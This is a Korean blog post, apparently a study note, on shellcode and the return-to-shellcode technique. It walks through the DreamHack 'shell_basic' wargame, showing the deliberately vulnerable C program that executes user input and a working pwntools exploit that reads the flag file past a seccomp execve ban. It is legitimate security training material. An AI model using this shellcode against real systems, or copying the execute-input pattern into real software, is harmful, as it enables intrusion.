---
title: "[PWNABLE] Shellcode & RTS"
description: "Shellcode 시스템 해킹의 목적 중 하나인 Shell을 취득하기 위한 코드조각이다. 바이트코드로 구성되어 있으며 스택 영역에 실행권한이 있는 상태(NX-BIT 비활성화)에서 사용이 가능하다. pwntools의 기능중에 shellcraft.sh라는 기능이 있다. 셸코드를 생성해주는 고마운 기능인데 해당 함수를 이용하면"
date: "2023-10-22"
translation_key: "tistory-4706b08f72f8"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-Shellcode-RTS"
private: false
---

#### Shellcode

시스템 해킹의 목적 중 하나인 Shell을 취득하기 위한 코드조각이다.

바이트코드로 구성되어 있으며 스택 영역에 실행권한이 있는 상태(NX-BIT 비활성화)에서 사용이 가능하다.

pwntools의 기능중에 shellcraft.sh라는 기능이 있다.

셸코드를 생성해주는 고마운 기능인데 해당 함수를 이용하면 손쉽게 원하는 기능의 셸코드를 제작할 수 있다.

```
from pwn import*

shellcode = shellcraft.sh()
print(shellcode)
print(hexdump(asm(shellcode)))
```

함수를 실행했을 때의 결과를 살펴보겠다.

![](/assets/images/tistory/tistory-4706b08f72f8/001.png)

어셈블리어 부분이 만들어진 코드이고,

아래 hex값으로 나온 부분이 셸코드의 바이트코드에 해당이 된다.

shellcraft.sh()에서 ()안에 아무것도 안넣어 주었기 때문에 기본적으로 기본 셸을 실행하는 코드가 만들어진다.

이후에 풀어볼 shell\_basic 문제의 경우 특정 파일을 읽는 코드를 만들어야 하기 때문에 

해당 부분에서 설명을 추가로 하겠다.

* * *

#### DreamHack shell\_basic 문제

shell\_basic문제는 드림핵에서 return to shellcode를 실습하는 문제이다.

먼저 주어진 코드를 살펴보겠다.

```
// Compile: gcc -o shell_basic shell_basic.c -lseccomp
// apt install seccomp libseccomp-dev

#include <fcntl.h>
#include <seccomp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <signal.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void init() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(10);
}

void banned_execve() {
  scmp_filter_ctx ctx;
  ctx = seccomp_init(SCMP_ACT_ALLOW);
  if (ctx == NULL) {
    exit(0);
  }
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
  seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execveat), 0);

  seccomp_load(ctx);
}

void main(int argc, char *argv[]) {
  char *shellcode = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  void (*sc)();

  init();

  banned_execve();

  printf("shellcode: ");
  read(0, shellcode, 0x1000);

  sc = (void *)shellcode;
  sc();
}
```

코드에서 취약점을 먼저 살펴보면

```
printf("shellcode: ");
read(0, shellcode, 0x1000);

sc = (void *)shellcode;
sc();
```

main함수에서 shellcode에 넣은 값을 함수의 기능으로 만들어 실행하고 있다.

그리고 execve 를 사용하는 셸코드를 사용하지 못하도록 되어 있다.

문제 페이지를 보면 flag 파일의 경로를 다음과 같이 주어준다.

/home/shell\_basic/flag\_name\_is\_loooooong

그렇다면 해당 부분을 읽는 셸코드를 생성하면 된다.

해당 파일을 읽기 위해서는 3가지 과정이 필요하다.

1\. 파일 열기

2\. 파일 내용 읽기

3\. 읽은 내용 출력하기

때문에 open => read => write 순으로 사용을 해야한다.

이를 코드로 작성하면 다음과 같다.

```
shellcraft.open(파일 경로)

shellcraft.read(rax, rsp, 0x100)

shellcraft.write(1,rsp,0x100)
```

read에서 첫 인자를 rax로 사용한 이유는

파일에서 사용중인 함수 호출 규약이 sys V이기 때문이다.

즉, 함수의 반환값을 rax 레지스터에 저장하는데 

파일이 정상적으로 열렸는지 확인 후 읽는 과정을 수행하기 위해

반환값을 fd로 사용한 것이다.

전체 payload를 보면 다음과 같이 구성할 수 있다.

아래 접은글은 최종 페이로드이다.

더보기

```
p=remote('host3.dreamhack.games',20328)
context.arch = "amd64"

flag_name = "/home/shell_basic/flag_name_is_loooooong"

payload = shellcraft.open(flag_name)
payload += shellcraft.read('rax','rsp',0x100)
payload += shellcraft.write(1,'rsp',0x100)

p.sendlineafter(b": ",asm(payload))
print(p.recv())

p.interactive()
```

실행하면 flag를 정상적으로 읽을 수 있다.

![](/assets/images/tistory/tistory-4706b08f72f8/002.png)
